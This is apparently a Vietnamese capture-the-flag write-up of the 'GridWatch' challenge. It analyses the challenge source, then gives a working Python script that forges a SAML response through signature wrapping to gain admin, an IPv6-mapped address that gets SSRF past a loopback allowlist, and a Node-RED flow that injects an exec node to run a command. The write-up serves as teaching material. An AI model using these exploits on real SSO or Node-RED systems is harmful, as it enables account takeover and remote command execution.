---
title: "GridWatch — Project Nightfall"
slug: "project-nightfall-gridwatch"
platform: "Global Cyber Skills Benchmark CTF 2026"
difficulty: "Medium"
vulnerabilities: ["SAML","Server-Side Request Forgery"]
publishedAt: "2026-09-14"
summary: "Ghi lại quá trình phân tích SSO, relay và các dịch vụ nội bộ của GridWatch trong Project Nightfall."
draft: false
sortOrder: 1
---
## I. Tổng quan
Bài này có hai lỗi chính: lỗi xác thực SAML và lỗi SSRF trong chức năng relay. Đầu tiên, mình tạo một `SAMLResponse` giả để đăng nhập thành admin bằng kỹ thuật `SAML ID confusion/metadata pollution`. Sau đó, từ quyền admin, mình dùng relay để SSRF vào Node-RED nội bộ thông qua payload `IPv6-mapped IPv4`.

Khi đã đi đến Node-RED, mình dùng API `/flows` để nạp một flow mới tạo endpoint `/pwn`. Endpoint này nối tới node `exec` chạy `/readflag`, rồi trả kết quả qua `http response`, từ đó lấy được flag.
## II. Phân tích chức năng

![image](https://hackmd.io/_uploads/SJnmhluJMx.png)

Challenge cung cấp một một web cơ bản với chức năng đăng nhập để nhận phiên đăng nhập và được chuyển lại về `GridWatch Portal`.
![image](https://hackmd.io/_uploads/B1fq1-_yMx.png)

Sau đó, web dùng thông tin SSO để xác định người dùng có phải admin hay không. Nếu là admin thì được vào dashboard chính và có quyền relay nội bộ để truy cập các feed vận hành; nếu không bị chuyển sang trang `Access Denied`.
## III. Phân tích mã nguồn
### 0. Một vài kiến thức cần thiết
- SAML là cơ chế đăng nhập một lần, trong đó dịch vụ xác thực sẽ tạo ra một thông điệp XML gọi là `SAMLResponse` để khẳng định người dùng là ai. Ứng dụng đích sẽ nhận `SAMLResponse`, kiểm tra chữ ký, rồi trích xuất các thông tin như `NameID` để tạo phiên đăng nhập.
- IdP, viết tắt của Identity Provider, là phía chịu trách nhiệm xác thực người dùng và phát hành `SAMLResponse`. Trong challenge này, service `auth` đóng vai trò IdP.
![image](https://hackmd.io/_uploads/B1PjaVsJGl.png)
- Node-RED là một nền tảng lập trình luồng bằng giao diện trực quan. Nó cho phép ghép các node xử lý như nhận HTTP request, thực thi lệnh hệ thống, rồi trả kết quả lại qua HTTP. Hiểu đơn giản là nối các khối thành luồng(flows) để lập trình.
![image](https://hackmd.io/_uploads/rkIH0Esyzg.png)
### 1.challenge\auth\models\identity.rb
- SAML chạy ở chế độ ghi log nếu gặp validation issue thay vì fail-hard nên khá đáng nghi.
![image](https://hackmd.io/_uploads/B1Q2vb9kfl.png)
- Email admin, credential mặc định và thư mục chứa certificate của IDP dùng để ký và verify.
![image](https://hackmd.io/_uploads/B1TCvZqyGg.png)
- Decode SAMLResponse từ base64 sang XML và parse thử bằng Nokogiri để kiểm tra format.
![image](https://hackmd.io/_uploads/rynP3-9kzx.png)
- App đưa `SAMLResponse` cho thư viện Samlr kiểm tra bằng fingerprint của cert IDP. Nếu `verify!` pass thì response được coi là hợp lệ.
![image](https://hackmd.io/_uploads/rJ3JaZ91fl.png)
- Phân quyền admin chỉ phụ thuộc vào `NameID`. Nếu `response.name_id` == `operator-admin@ops.beacon` thì lên admin.
![image](https://hackmd.io/_uploads/BJPvp-q1fl.png)
- IDP tự có key/cert riêng. App load cert của IDP, tạo fingerprint từ cert đó, rồi dùng fingerprint này để verify SAMLResponse. Ngoài ra IDP còn public signed metadata, giúp thu thập chính xác trust material và cấu hình SAML của hệ thống.
![image](https://hackmd.io/_uploads/BJdKa-cyGx.png)
### 2.challenge\auth\controllers\identity_controller.rb
- Endpoint này public ra `SIGNED_METADATA` của IDP dưới dạng XML. Metadata này giúp thu thập trust material và thông tin cấu hình `SAML` của hệ thống.
![image](https://hackmd.io/_uploads/ByBMxzckGx.png)
- Nhận credential từ form; password được so sánh trực tiếp với `DEFAULT_PASSWORD`.
![image](https://hackmd.io/_uploads/BkdXlM91ze.png)
- Mọi email chứa chuỗi "admin", hoặc email rỗng, đều bị ép về `USER_EMAIL`. Vì vậy không thể lấy `NameID` admin qua luồng đăng nhập UI thông thường.
![image](https://hackmd.io/_uploads/H1dvgf5yzg.png)
- IDP tự build `SAMLResponse` từ `name_id`, sau đó base64-encode để gửi về client.
![image](https://hackmd.io/_uploads/HkNteM5kfx.png)
- App nhận `SAMLResponse` từ request, verify nó, rồi lấy `respond.name_id` để quyết định quyền admin.
![image](https://hackmd.io/_uploads/SJPkbf9Jfx.png)
### 3.challenge\web\controllers\handlers.py
- `/sso/acs` là endpoint ACS của web chính, nhận `SAMLResponse` do browser POST về sau bước SSO.
![image](https://hackmd.io/_uploads/rJ6T-fckGx.png)
- Web app không tự verify `SAML` tại chỗ; nó forward `SAMLResponse` sang auth service `/api/verify` rồi dùng kết quả trả về.
![image](https://hackmd.io/_uploads/HJQ7MMcJzg.png)
- Sau khi auth service verify xong, web chính lấy `name_id` và `is_admin` từ JSON trả về để dựng session local
![image](https://hackmd.io/_uploads/rkvYff5Jzg.png)
- Nếu `is_admin = true` thì user được redirect vào dashboard `/`; nếu không thì bị chuyển tới `/access-denied`. Sau khi tạo session thành công, web app set cookie phiên đăng nhập cho browser.
![image](https://hackmd.io/_uploads/ByshGzcJMx.png)

$\Rightarrow$ Ta có một sơ đồ luồng xác minh SAML và phiên đăng nhập admin như sau.

![SAML Authentication Flow-2026-05-18-143852 (1)](https://hackmd.io/_uploads/Byv8SoOJMe.png)


**4.challenge\feed\app.py**
- Ứng dụng đăng ký route ``/relay/{feed}/`` và chuyển toàn bộ xử lý cho `fetch_feed`. Đây chỉ mới thấy đây là một endpoint đặc biệt nhận tham số `feed` từ URL.
![image](https://hackmd.io/_uploads/SJ0ida_kfg.png)

### 5. challenge\web\controllers\handlers.py
- Ngay đầu hàm, route này kiểm tra người dùng phải có session và phải là admin. Sau đó nó lấy `feed` từ path và `path` từ query để chuẩn bị ghép thành đích truy cập.
![image](https://hackmd.io/_uploads/r1eg9puJMx.png)
- Ứng dụng chỉ cho phép relay tới hai địa chỉ loopback này. Vì vậy mọi hostname hợp lệ cuối cùng đều phải phân giải về một trong hai IP trên.
![image](https://hackmd.io/_uploads/HJ_wUaOkGl.png)
- Filter rất yếu, chỉ replace vài ký tự đặc biệt nên payload hostname lạ vẫn bypass được.
![image](https://hackmd.io/_uploads/SyL0cTu1fg.png)
- Hàm này tách hostname từ URL, resolve DNS sang IP rồi mới so với allowlist. Muốn đi tiếp qua lớp kiểm tra này thì hostname phải được lái về IP được phép, đặc biệt là `127.0.0.11`.
![image](https://hackmd.io/_uploads/rJ0KTTd1Ml.png)
### 6. challenge\dns\app.py
- File DNS nội bộ map từng nhóm domain `.beacon` sang các địa chỉ loopback khác nhau. Ta có thể thấy `127.0.0.11` là một service riêng, còn `127.0.0.12` là service auth.
![image](https://hackmd.io/_uploads/B1FXJ0_Jfx.png)
- Resolver không trả IP cho mỗi domain gốc mà cho mọi subdomain của nó. Ví dụ, `x.ops.beacon` hay `y.beacon` vẫn được map vào đúng IP tương ứng
![image](https://hackmd.io/_uploads/ryeFeAOJMl.png)
### 7. challenge\nodered\settings.js
- Node-RED chỉ bind ở `127.0.0.11:80` tức nó nằm ở trong nội bộ. Có điểm đáng chú ý là quản trị bị tắt xác thực với `adminAuth: false`.
![image](https://hackmd.io/_uploads/Bk-hmAuyGg.png)
### 8. Flag được bảo vệ
- Flag được đặt tại `/root/flag.txt` với quyền đọc rất chặt(0400). Hệ thống biên dịch ra chương trình `/readflag` và gắn bit 4755 tức SUID root.
![image](https://hackmd.io/_uploads/rkCdNCuJMx.png)
- `/readflag` mở file flag rồi ghi nội dung ra stdout. Mà chương trình chạy với quyền root nên đây là cửa hợp lệ để lấy `/root/flag.txt`
## IV. Các bước tiếp cận và khai thác
### Xây dựng luồng tấn công
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Nhìn cách flag được thiết lập và`/readflag`, nên ta phải tìm được một cách để dẫn tới command excecution. Sau khi phân tích mã nguồn, ta có thể thấy`/relay/{feed}/` như một cơ chế backend dùng để chuyển tiếp request tới các service nội bộ được allowlist. Từ DNS map và cấu hình Node-RED, có thể suy ra một trong các đích quan trọng của cơ chế này là Node-RED tại `127.0.0.11:80`. Và kết hợp thêm việc `adminAuth: false` với một cơ chế đặc biệt sau đây:
![image](https://hackmd.io/_uploads/HkiwUaKkzg.png)


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; `POST /flows` là một API của Node-Red để ghi đè flow configuration đang chạy.Một khi gọi được nó, ta không chỉ xem cấu hình mà còn có thể nạp logic mới vào hệ thống. Nếu trong flow đó mình thêm được các node như `http in`, `exec`, `http response`. Tức là mình đã thêm được một endpoint mới và khi nó được gọi nó sẽ chạy lệnh và trả kết quả qua HTTP. Từ đây có thể xâu chuỗi với việc gọi `/readflag`.`GET /flows` chỉ đóng vai trò hỗ trợ kiểm tra hoặc lấy flow hiện tại, còn bước khai thác quyết định là `POST /flows` để chèn logic thực thi lệnh.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Tuy nhiên, `/relay/{feed}/` bị chặn ngay nếu không có session admin.Còn `beacon_session` chỉ là random server-side ID nên không thể forge cookie trực tiếp. Vì vậy muốn vào `/relay` thì phải làm backend tự tạo session admin. Trong `sso_acs`, quyền admin được lấy từ kết quả verify SAMLResponse qua `/api/verify`, gồm `name_id` và `is_admin`.Login bình thường không bao giờ có admin, Điểm cần đánh vào là bước xác minh `SAMLResponse` chứ không phải cookie.

$\Rightarrow$ Ta có một sơ đồ luồng tấn công như sau:
![flow (1)](https://hackmd.io/_uploads/BknWO6YJMl.png)


### Tiến hành tấn công
- Nhìn vào sơ đồ tấn công ở trên, giờ ta cần đánh vào `SAMLREsponse`. Sẽ có một ý tưởng hiện lên ngay từ đầu đó là lấy một `SAMLRespose` đã kí thật rồi sửa `NameID` từ user thành admin. 
![image](https://hackmd.io/_uploads/Hk5A35t1fl.png)
![image](https://hackmd.io/_uploads/SkQnnctJfx.png)
- Sau khi decode sửa lại `NameID`, encode lại và gửi lên `/sso`
![image](https://hackmd.io/_uploads/ryukksYJMl.png)
- Tuy nhiên, nó sẽ trả về lỗi `Digest mismatch` chứng tỏ chữ ký thực sự bảo vệ nội dung assertion/respone liên quan và việc mình cũng không có private key của IdP nên cũng không thể tự ký một `SAMLResponse` mới. Mình cũng đã thử thêm một vài cách khác nhưng đều không có hiệu quả.
- Giờ ta cần mang một `SAMLResponse` có thể vượt qua bước verify. Đây là lúc `/idp/metadata` phát huy tác dụng. SAML metadata công khai của IdP và ở đây ta đã xem được thuật toán, `SignatureValue` và `Certificate`.
![image](https://hackmd.io/_uploads/Bkf2YwtJMe.png)
- Từ đây, ta có thể nghĩ đến việc `signed metadata reuse`. Thay vì cố kí giả thì giờ ta dùng luôn cái metadata đã ký vào tài liệu với một assertion do mình kiểm soát. Tức mình sẽ tìm cách tạo ra sự rối giữa phần nào sẽ là cái xác minh chữ kí và phần sẽ được đọc dữ liệu. Đây gọi là `XML Signature Wrapping`. Một tài liệu từ OWASP mô tả lỗ hổng này như sau:
![image](https://hackmd.io/_uploads/SyJIFiYJze.png)
![image](https://hackmd.io/_uploads/BJEYKstkMe.png)
- Nghĩa là `saml:Assertion (1)` đã được ký hợp lệ nhưng attacker không sửa nội dung `assertion(1)` mà chèn thêm `assertion(2)`. Vấn đề ở chỗ verify kiểm tra `assertion (1)` nhưng ứng dụng lại đọc `assertion (2)`
- Tôi đã sửa lại một ít 2 file là `identity.rb`, `identity_controller.rb` để có thể xem rõ hơn chữ kí tham chiếu đến `ID` nào và verify `name_id` nào.
![image](https://hackmd.io/_uploads/SyVbihtyzx.png)
$\Rightarrow$ Chữ ký đang tham chiếu tới một `ID` hợp lệ và verify đang dùng `name_id` đúng. Giờ ta tạo một `SAMLResponse` mới từ đoạn code sau:
```python=
#!/usr/bin/env python3
import base64
import re
import uuid
from datetime import datetime, timedelta, timezone
from urllib.parse import urlencode
from urllib.request import urlopen
from xml.etree import ElementTree as ET

TARGET = "http://localhost:1337"
ADMIN_NAME_ID = "operator-admin@ops.beacon"

def stamp(dt):
    return dt.strftime("%Y-%m-%dT%H:%M:%SZ")

def fetch_metadata():
    with urlopen(f"{TARGET}/idp/metadata") as r:
        xml = r.read().decode()
    xml = re.sub(r"^\s*<\?xml[^>]*\?>\s*", "", xml, count=1)
    root = ET.fromstring(xml)

    metadata_id = root.attrib.get("ID")
    if not metadata_id:
        raise RuntimeError("metadata has no ID")

    return metadata_id, xml

def build_saml_xml():
    metadata_id, metadata_xml = fetch_metadata()

    now = datetime.now(timezone.utc)
    not_before = now - timedelta(minutes=1)
    not_after = now + timedelta(hours=1)

    response_id = "_" + uuid.uuid4().hex
    assertion_id = "_" + uuid.uuid4().hex
    session_id = "_" + uuid.uuid4().hex

    xml = f"""<samlp:Response
  xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
  samlp:ID="{metadata_id}"
  ID="{response_id}"
  Version="2.0"
  IssueInstant="{stamp(now)}"
  Destination="/sso/acs">
  <saml:Issuer>beacon-auth-idp</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion ID="{assertion_id}" Version="2.0" IssueInstant="{stamp(now)}">
    <saml:Issuer>beacon-auth-idp</saml:Issuer>
    <saml:Subject>
      <saml:NameID>{ADMIN_NAME_ID}</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData Recipient="/sso/acs" NotOnOrAfter="{stamp(not_after)}"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="{stamp(not_before)}" NotOnOrAfter="{stamp(not_after)}">
      <saml:AudienceRestriction>
        <saml:Audience>beacon-sso</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement AuthnInstant="{stamp(now)}" SessionIndex="{session_id}">
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
  </saml:Assertion>
  {metadata_xml}
</samlp:Response>"""
    return xml

def build_saml_base64():
    xml = build_saml_xml()
    return base64.b64encode(xml.encode()).decode()

if __name__ == "__main__":
    xml = build_saml_xml()
    saml_b64 = base64.b64encode(xml.encode()).decode()
    saml_form = urlencode({"SAMLResponse": saml_b64})

    print("==== XML ====")
    print(xml)
    print("\n==== BASE64 ====")
    print(saml_b64)
    print("\n==== URL ENCODED FORM BODY ====")
    print(saml_form)
```
- Đoạn code này lấy metadata đã được ký từ `/idp/metadata`, rồi dựng một `SAMLResponse` giả mới với `NameID` đặt thành `operator-admin@ops.beacon`. Sau đó nó nhúng nguyên `metadata XML` đã ký vào cuối tài liệu, base64-encode toàn bộ XML và URL-encode thành giá trị `SAMLResponse` để gửi trong form login. Đây là sườn của đoạn XML:
```xml=
<samlp:Response samlp:ID="ID_cua_metadata_that" ID="ID_cua_response_gia" Destination="/sso/acs">
  <saml:Issuer>beacon-auth-idp</saml:Issuer>
  <saml:Assertion ID="ID_cua_assertion_gia">
    <saml:Subject>
      <saml:NameID>operator-admin@ops.beacon</saml:NameID>
      <saml:SubjectConfirmation>
        <saml:SubjectConfirmationData Recipient="/sso/acs"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions><saml:AudienceRestriction><saml:Audience>beacon-sso</saml:Audience></saml:AudienceRestriction></saml:Conditions>
  </saml:Assertion>
  <md:EntityDescriptor ID="ID_cua_metadata_that">...<ds:Signature>...</ds:Signature>...</md:EntityDescriptor>
</samlp:Response>
```
- Ta xác nhận chữ ký được xác thực trên `metadata` thật được nhúng vào XML, nhưng `NameID` lại được đọc từ `Assertion` giả do mình tạo. Vì vậy, server chấp nhận và cho ta quyền admin giúp ta vào được portal admin.
![image](https://hackmd.io/_uploads/ByUKN6Ykfe.png)
![image](https://hackmd.io/_uploads/ryu8npFkMx.png)
- Giờ sang bước SSRF, App ép chúng ta request ở dạng `http://{feed}.feed.beacon:80{path}` nên nếu như bình thường request chỉ đi tới `*.feed.beacon` và service feed ở `127.0.0.10`. Khi gặp một bài hostname ghép chuỗi kiểu như này, ta thường nên nghĩ ngay đến các kĩ thuật như `parser abuse` hay `alternative IP representations`. Và trong nhóm này, có một Payload rất kinh điển có thể sử dụng trong bài này.
![image](https://hackmd.io/_uploads/rkWn-Bjkfe.png)
![image](https://hackmd.io/_uploads/HkjTZrjJfe.png)
- Đây là kỹ thuật viết một địa IPv4 dưới dạng IPv6.Với `127.0.0.11`, ta đổi sang hex được `7f 00 00 0b`, rồi gộp thành hai nhóm 16-bit là `7f00:b`, nên dạng IPv6-mapped sẽ là `::ffff:7f00:b`. Khi đặt trong URL, IPv6 literal phải nằm trong `[]`, nên payload cuối cùng là `[::ffff:7f00:b]`, và khi URL-encode sẽ thành `%5B::ffff:7f00:b%5D`.
- Khi đưa Payload này vào, ứng dụng tạo ra một URL bị lệch chuẩn kiểu `http://[::ffff:7f00:b].feed.beacon:80/flows`.Với parser URL, phần nằm trong `[]` được hiểu như một IPv6 literal, tức host thực là `::ffff:7f00:b`, tương đương `127.0.0.11`. Parser lại ưu tiên hiểu phần host đặc biệt này thành một địa chỉ IP nội bộ. Từ đây ta đã thành công trong việc chạm vào Node-RED, nơi API `/flows` trả về danh sách flow hiện tại (chưa có gì).
![image](https://hackmd.io/_uploads/SJBvQCKyfl.png)
- Giờ ta sẽ upload một Node-RED flow gồm 4 node. Mục đích để tạo một endpoint `/pwn` và khi endpoint này được gọi nó sẽ chạy lệnh `/readflag` và ouput về HTTP respone
```json=
[
  {
    "id": "tab_pwn",
    "type": "tab",
    "label": "pwn",
    "disabled": false,
    "info": ""
  },
  {
    "id": "in_pwn",
    "type": "http in",
    "z": "tab_pwn",
    "name": "",
    "url": "/pwn",
    "method": "get",
    "upload": false,
    "swaggerDoc": "",
    "x": 120,
    "y": 80,
    "wires": [["exec_flag"]]
  },
  {
    "id": "exec_flag",
    "type": "exec",
    "z": "tab_pwn",
    "command": "/readflag",
    "addpay": false,
    "append": "",
    "useSpawn": "false",
    "timer": "",
    "winHide": false,
    "oldrc": false,
    "name": "",
    "x": 300,
    "y": 80,
    "wires": [["resp_flag"], [], []]
  },
  {
    "id": "resp_flag",
    "type": "http response",
    "z": "tab_pwn",
    "name": "",
    "statusCode": "",
    "headers": {},
    "x": 500,
    "y": 80,
    "wires": []
  }
]
```
![image](https://hackmd.io/_uploads/BJxpLAKJGl.png)
![image](https://hackmd.io/_uploads/B1XRLAFJfg.png) 
- Respone trả 204 No Content và log Node-RED báo như trên tức xác nhận tuyệt đối là Node-RED đã nhận JSON và giờ mình gọi đến endpoint mình đã tạo và sẽ có flag
- Gọi lại thử API `/flows` và thấy các node đã được upload thành công. Gọi đến endpoint `/pwn` mình đã tạo để lấy flag.
![image](https://hackmd.io/_uploads/HJDC2rsyzl.png)
![image](https://hackmd.io/_uploads/B1tcwAYyzg.png)
- Thực hiện lại chain này ở trên remote và ta có flag:
![image](https://hackmd.io/_uploads/SJbKj99yMg.png)

